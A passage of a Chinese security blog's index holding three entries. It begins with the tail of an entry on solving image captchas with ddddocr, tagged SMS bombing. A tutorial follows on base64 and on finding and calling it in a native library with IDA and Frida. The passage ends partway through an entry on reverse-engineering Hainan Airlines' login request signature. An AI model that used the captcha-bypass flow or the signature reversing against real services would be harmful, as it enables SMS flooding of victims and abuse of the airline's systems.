title="tip-自定义流程顺序很重要"></a>tip-自定义流程顺序很重要</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235530.png" alt="img"></p><p>1、get_yzm：通过接口获取到验证码响应体（包括code和codeid）</p><p>2、re_id：正则匹配，从get_yzm中获取到codeid</p><p>3、re_image：正则匹配，从get_yzm中获取到code的base64编码</p><p>4、get_image：通过flask调用ddddocr接口，识别验证码，获得code</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片验证码 </tag>
            
            <tag> ddddocr </tag>
            
            <tag> TangGo </tag>
            
            <tag> 短信轰炸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之base64</title>
      <link href="/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/"/>
      <url>/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="加密与解密的关系"><a href="#加密与解密的关系" class="headerlink" title="加密与解密的关系"></a>加密与解密的关系</h2><ol><li><strong>加密</strong>：是将原始的、可读的信息（明文）转换为另一种形式（密文）的过程，这样就可以防止未授权的访问。加密算法和密钥用于这一转换过程。加密的目的是确保信息的机密性，即使密文在传输或存储过程中被截获，没有正确的密钥也无法理解其内容。</li><li><strong>解密</strong>：是加密的逆过程，它将密文转换回原始的明文。只有拥有正确密钥的人才能解密信息并获取原始内容。</li></ol><p>加密和解密的关系可以概括为以下几点：</p><ul><li><strong>互为逆过程</strong>：加密和解密使用相同类型的算法，但执行相反的操作。加密算法设计时必须确保可以逆向操作，以便解密。</li><li><strong>密钥的使用</strong>：加密和解密通常依赖于密钥。在加密过程中使用密钥生成密文，在解密过程中使用相同的密钥从密文恢复明文。密钥的安全管理是加密系统能否有效工作的关键。</li><li><strong>安全性</strong>：加密系统的设计目标是确保即使攻击者知道加密算法，也无法在没有密钥的情况下解密信息。因此，加密算法通常是公开的，而密钥则必须保密。</li><li><strong>应用场景</strong>：加密和解密广泛应用于多种场景，如网络安全中的数据传输、数据存储、数字签名等，以确保信息的保密性、完整性和可用性。</li></ul><p>在现代密码学中，加密和解密算法多种多样，包括对称加密（如AES）、非对称加密（如RSA）、散列函数等，它们在不同的应用场景中提供了不同级别的安全性。</p><h2 id="加密的简单分类"><a href="#加密的简单分类" class="headerlink" title="加密的简单分类"></a>加密的简单分类</h2><p>加密技术可以分为几个基本类别，每个类别都有其特定的用途和特点。以下是一些简单的分类：</p><ol><li><p><strong>对称加密（Symmetric Encryption）</strong>：</p><ul><li>使用相同的密钥进行加密和解密。</li></ul><ul><li><p>速度快，适用于大量数据的加密。</p></li><li><p>典型的算法包括AES（Advanced Encryption Standard）、DES（Data Encryption Standard）、3DES（Triple Data Encryption Algorithm）等。</p></li></ul></li><li><p><strong>非对称加密（Asymmetric Encryption）</strong>：</p><ul><li>使用一对密钥：公钥和私钥。公钥用于加密，私钥用于解密。</li></ul><ul><li><p>安全性高，但速度较慢，适用于小量数据的加密。</p></li><li><p>典型的算法包括RSA、ECC（Elliptic Curve Cryptography）、Diffie-Hellman等。</p></li></ul></li><li><p><strong>哈希函数（Hash Functions）</strong>：</p><ul><li>将输入（无论大小）映射到一个固定长度的哈希值。</li></ul><ul><li><p>用于确保数据的完整性，因为即使输入数据有很小的变化，哈希值也会发生显著变化。</p></li><li><p>不是加密算法，因为哈希是不可逆的，不能用于解密。</p></li><li><p>典型的算法包括MD5、SHA-1、SHA-256等。</p></li></ul></li></ol><h1 id="实现标准的base64"><a href="#实现标准的base64" class="headerlink" title="实现标准的base64"></a>实现标准的base64</h1><h2 id="1-base64原理"><a href="#1-base64原理" class="headerlink" title="1. base64原理"></a>1. base64原理</h2><p>Base64编码的原理是将每三个字节的数据（共24位）划分为四个6位的段，然后每个6位的段转换为一个对应的可打印字符。Base64编码表包含64个字符：<strong>大写字母A到Z</strong>、<strong>小写字母a到z</strong>、<strong>数字0到9</strong>、<strong>加号（+）和斜杠（&#x2F;）</strong>。</p><p>下面是一个Python的代码示例，展示了如何实现标准的base64编码和解码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base64</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">original_data = <span class="string">b&#x27;Hello, World!&#x27;</span></span><br><span class="line">encoded_data = encode_base64(original_data)</span><br><span class="line">decoded_data = decode_base64(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original data: <span class="subst">&#123;original_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded data: <span class="subst">&#123;encoded_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded data: <span class="subst">&#123;decoded_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意，Base64编码并不是一种加密方法，它不提供数据的安全性，只是将数据转换成一种适合在不同系统间传输的格式</p><h2 id="2-示例说明"><a href="#2-示例说明" class="headerlink" title="2. 示例说明"></a>2. 示例说明</h2><p>假设要对字符串 “Man” 进行base64编码，整个过程如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161502428.jpeg" alt="img"> </p><p>第一步：“M”、“a”、”n”对应的ASCII码值分别为77，97，110，对应的二进制值是01001101、01100001、01101110。如图第二三行所示，由此组成一个24位的二进制字符串。</p><p>第二步：如图红色框，将24位每6位二进制位一组分成四组。</p><p>第三步：在上面每一组前面补两个0，扩展成32个二进制位，此时变为四个字节：00010011、00010110、00000101、00101110。分别对应的值（Base64编码索引）为：19、22、5、46。</p><p>第四步：用上面的值在Base64编码表中进行查找，分别对应：T、W、F、u。因此“Man”Base64编码之后就变为：TWFu。</p><p><strong>位数不足情况</strong></p><p>上面是按照三个字节来举例说明的，如果字节数不足三个，那么该如何处理？</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161503074.png" alt="img"> </p><p><strong>两个字节</strong>：两个字节共16个二进制位，依旧按照规则进行分组。此时总共16个二进制位，每6个一组，则第三组缺少2位，用0补齐，得到三个Base64编码，第四组完全没有数据则用 “&#x3D;” 补上。因此，上图中“BC”转换之后为“QKM&#x3D;”；</p><p><strong>一个字节</strong>：一个字节共8个二进制位，依旧按照规则进行分组。此时共8个二进制位，每6个一组，则第二组缺少4位，用0补齐，得到两个Base64编码，而后面两组没有对应数据，都用“&#x3D;”补上。因此，上图中“A”转换之后为“QQ&#x3D;&#x3D;”；</p><h2 id="3-base64实现"><a href="#3-base64实现" class="headerlink" title="3. base64实现"></a>3. base64实现</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161514951.png" alt="image.png"> </p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义base64的种子</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64en[] = &#123;</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>,  <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,  <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>,   <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,  <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//base64加密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;  <span class="comment">//定义out的索引</span></span><br><span class="line">    <span class="type">char</span> last_c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        c = data[i];</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                out[index++] = base64en[(c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3f</span> ];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                out[index++] = base64en[((last_c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | ((c &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span> )];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                out[index++] = base64en[( ( last_c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span> ) | ((c &gt;&gt; <span class="number">6</span> ) &amp; <span class="number">0x3</span>)];</span><br><span class="line">                out[index++] = base64en[c &amp; <span class="number">0x3f</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        last_c = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len % <span class="number">3</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        out[index++] = base64en[(c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len % <span class="number">3</span> == <span class="number">2</span>)&#123;</span><br><span class="line">        out[index++] = base64en[( c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="comment">//可以看到有三个参数：</span></span><br><span class="line">    <span class="comment">//①JNI *env表示java环境；</span></span><br><span class="line">    <span class="comment">//②jobject thiz这块对应函数名，如果是static静态方法，这块参数将为jclass claz。非static方法则为jobject thiz</span></span><br><span class="line">    <span class="comment">//③传入真正的参数</span></span><br><span class="line"><span class="built_in">Java_com_roysue_base64_MainActivity_base64_1enc</span>(JNIEnv *env, jobject thiz, jstring data) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement base64_enc()</span></span><br><span class="line">    <span class="type">char</span> *c_data = <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(env-&gt;<span class="built_in">GetStringUTFChars</span>(data, <span class="number">0</span>));  <span class="comment">//将java层的data参数传入到C中，并进行类型强转</span></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(c_data);  <span class="comment">//定义c_data的长度</span></span><br><span class="line">    <span class="type">char</span> out[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">base64_enc</span>(c_data,len,out);  <span class="comment">//调用base64_enc进行base64编码</span></span><br><span class="line">    env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(data,c_data);  <span class="comment">//进行内存的释放，将前面定义的变量进行释放</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(out);  <span class="comment">//得到加密后的值</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码介绍：</strong></p><p>由于base64编码是将编码前的3*8位数据，分解成4个6位的数据，所以经过base64编码后的字符串长度是4的倍数。</p><p>但往往进行编码的数据长度并不是3的倍数，这就造成了“编码”后的位数不为4的倍数，比如 “Brisk” 共5×8&#x3D;40位，以6位为一组可以分为7组，这样“编码”后就有7个字符，但base64编码后的字符长度应该是4的倍数，显然这里就出问题了，那么怎么办呢？前面的不可以抛弃掉，所以就只有“追加”了，所以Brisk经过base64编码后的长度应该是8个字符，而第8个编码后的字符是’&#x3D;’，再比如对单个字符a进行base64编码，由于它的长度不是3的倍数，以3个字节为一组它只能分一组，再以6位为一位它只能分两组，所以经过“编码”后它的长度是2，但base64编码后的个数应该是4的倍数，所以它的长度应该是4，所以在后面补上两个‘&#x3D;’,由于一个数求余3后有三个不同的结果，0、1、2，所以在对一个数据进行base64进行编码后它的长度为：</p><p>（1）当进行编码的数据长度是3的倍数时，len&#x3D;strlen(str_in)&#x2F;3*4;</p><p>（2）当进行编码的数据长度不是3的倍数时，len&#x3D;(strlen(str_in)&#x2F;3+1)*4;</p><p>上面的代码实现分为了两个部分：</p><p>第一部分：输入数据长度是3的倍数，按照base64的原理对数据进行移位操作，转换承对应的base64编码</p><p>第二部分：如果不是3的倍数，也就意味（len % 3 &#x3D;&#x3D; 1）或者（len % 3 &#x3D;&#x3D; 2），则需要在后面补充对应的 “&#x3D;”</p><h1 id="base64逆向识别—IDA"><a href="#base64逆向识别—IDA" class="headerlink" title="base64逆向识别—IDA"></a>base64逆向识别—IDA</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>将前面写好的代码打包成apk后，解压，拿到里面的so文件，利用IDA进行分析：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745544.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745698.png" alt="image.png"> </p><p>1、将so文件拖入到IDA中</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745356.png" alt="image.png"> </p><p>2、找到我们定义好的导出函数 base64_enc。</p><p>可以看到从java层到so层，函数的命名会发生一定变化，在so层叫做 “Java_com_roysue_base64_MainActivity_base64_1enc”(Java_包名_函数名)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745469.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745189.png" alt="image.png"> </p><p>3、找到了具体的base64的实现流程：base64_enc(s, v4, (char *)v8);</p><ul><li>s：传入的字符串data</li><li>v4：字符串长度</li><li>(char*)v8：保存输出内容的变量</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745751.png" alt="img"> </p><p>用了“<em>Z10base64_encPciS</em>(a1, a2, a3);”函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746949.png" alt="image.png"> </p><h2 id="2-base64-enc"><a href="#2-base64-enc" class="headerlink" title="2. base64_enc"></a>2. base64_enc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+4h] [bp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [sp+Ah] [bp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v10; <span class="comment">// [sp+Bh] [bp-11h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = data[i];</span><br><span class="line">    v7 = i % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = v11++;</span><br><span class="line">        out[v4] = byte_16FC4[(<span class="number">16</span> * (v10 &amp; <span class="number">3</span>)) | (v9 &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        out[v11] = byte_16FC4[(<span class="number">4</span> * (v10 &amp; <span class="number">0xF</span>)) | (v9 &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">        v5 = v11 + <span class="number">1</span>;</span><br><span class="line">        v11 += <span class="number">2</span>;</span><br><span class="line">        out[v5] = byte_16FC4[v9 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      out[v3] = byte_16FC4[v9 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    out[v11] = byte_16FC4[<span class="number">16</span> * (v9 &amp; <span class="number">3</span>)];</span><br><span class="line">    out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    result = out;</span><br><span class="line">    out[v11 + <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)(len % <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      out[v11] = byte_16FC4[<span class="number">4</span> * (v9 &amp; <span class="number">0xF</span>)];</span><br><span class="line">      result = out;</span><br><span class="line">      out[v11 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、查看代码，可以看到byte_16FC4参数，对应内容是一个标准的base64编码表</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746200.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161747749.png" alt="image.png"></p><p>到这块就可以大胆猜测一下，当前算法为base64了，因为base64的参数因子是该编码的一个特征。</p><p>哪怕有的base64编码做了魔改，其实本质也大都是修改<strong>参数因子</strong>的内容！</p><p>2、对比上面写的C代码，是将switch转换成了一个多层的if判断</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161748467.png" alt="image.png"> </p><p>剩下的就不具体分析了，略略略~</p><h1 id="frida-so入门"><a href="#frida-so入门" class="headerlink" title="frida so入门"></a>frida so入门</h1><p>上面的so代码是没有做符号抽取的，所以可以看到对应的函数名字。要是做了符号抽取，函数名是不可被直接识别的。</p><p>所以，当判断一个so层的函数可能实现了特定功能的时候，可以调用frida来实现主动调用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">base64_enc</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> func_addr = base.<span class="title function_">add</span>(<span class="number">0x8E85</span>) ; <span class="comment">//0x8E84是函数的偏移地址，+1是为了跳过Thumb指令</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(func_addr,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])  <span class="comment">//声明函数，第一个参数是函数地址，第二个参数是函数返回值类型，第三个参数是函数参数类型</span></span><br><span class="line">    <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//分配内存，用于存放输入的字符串</span></span><br><span class="line">    <span class="title function_">ptr</span>(arg1).<span class="title function_">writeUtf8String</span>(data) <span class="comment">//向内存中写入输入的字符串</span></span><br><span class="line">    <span class="keyword">var</span> arg3 = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">100</span>) <span class="comment">//分配内存，用于存放输出的base64字符串</span></span><br><span class="line">    <span class="title function_">func</span>(arg1,data.<span class="property">length</span>,arg3) <span class="comment">//调用函数，第一个参数是输入的字符串地址，第二个参数是输入的字符串长度，第三个参数是输出的base64字符串地址</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(arg3).<span class="title function_">readCString</span>() <span class="comment">//读取输出的base64字符串</span></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">//返回base64字符串</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、查找函数基址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var base = Module.findBaseAddress(&#x27;libnative-lib.so&#x27;);</span><br><span class="line">var func_addr = base + 0x8E84 + 1; //0x8E84是函数的偏移地址，+1是为了跳过Thumb指令</span><br></pre></td></tr></table></figure><p>通过Module.findBaseAddress获取so文件的基址，再查找到函数的偏移地址。</p><p>然后还需要判断当前指令集是thumb的还是arm的。判断步骤如下：</p><p>（1）Option-&gt;Gereral-&gt;设置字节大小为4</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750656.png" alt="image.png"> </p><p>（2）查看函数中的地址，如果全部为4字节的话，为arm指令集；如果含有2个字节，则为thumb指令集，thumb指令集在查找函数基址时要+1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750054.png" alt="image.png"> </p><p>2、最终执行结果如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161750989.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> 算法还原 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空hnsign逆向</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BAhnsign%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空hnsign逆向</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：签名算法：通常签名有一个对象组合的操作，字符串拼接的操作，然后再对这个对象属性或字符串进行一个排序，组合的代码，看不懂，最方便的方式调试，拿到它组合后的结果。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648957.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><p>跟进这个加密函数中，可以发现依旧是webpack：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648859.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a.default._makeSign(null, c, p, null, n)</span><br></pre></td></tr></table></figure><p>找到定义对象 “a” 的地方，向上翻，找到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = E(n(38195))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101648160.png" alt="image.png"> </p><h2 id="1、扣取启动器"><a href="#1、扣取启动器" class="headerlink" title="1、扣取启动器"></a>1、扣取启动器</h2><p>正常方法，在函数 n 处，下断点，定位到启动器位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101650788.png" alt="image.png"> </p><p>改写后，启动器如下：（和前面password的一样）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2、扣取加密模块"><a href="#2、扣取加密模块" class="headerlink" title="2、扣取加密模块"></a>2、扣取加密模块</h2><p>这块第一个扣取的模块为 “<strong>38195</strong>”</p><p>然后依次根据提示，缺少什么模块就扣取什么</p><p>如果扣取过程中有出现报报错，那就解决报错。</p><p>加载模块比较多，扣取代码都要好久~~~</p><p><img 